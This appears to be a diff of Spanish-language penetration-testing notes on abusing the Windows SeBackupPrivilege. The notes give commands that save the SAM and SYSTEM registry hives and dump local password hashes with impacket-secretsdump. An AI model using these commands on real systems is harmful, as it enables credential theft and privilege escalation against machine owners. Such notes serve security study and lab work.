@@ -132,12 +132,11 @@ Notas:
 3. 'SeBackupPrivilege' = Permite leer cualquier archivo del sistema, ignorando sus permisos NTFS. Se puede copiar archivos críticos del sistema como el 'SAM, SYSTEM o NTDS.dit', incluso si no tiene permisos NTFS explícitos para ello. Estos archivos contienen información sensible como: 'Hashes de contraseñas locales, Credenciales de cuentas del dominio (si es un DC) y Configuraciones de seguridad'
 
 
-Pasos:
-❯ mkdir C:\Temp        # Crear un directorio en la maquina Windows e ingresar a el        
+Pasos:   
 ❯ reg save hklm\sam C:\temp\sam.hive            # Hacer una copia de la SAM al directorio creado y se descarga
 ❯ reg save hklm\system C:\temp\system.hive      # Hacer una copia del system y se descarga 
 
-❯ impacket-secretsdump -sam sam.hive -system system.hive LOCAL     # Dumpear los hashes de los usuarios
+❯ impacket-secretsdump -sam sam.hive -system system.hive LOCAL     # Dumpear los hashes de los usuarios desde Kali 
 
 Notas:
 	1. https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md      # Forma de explotar 
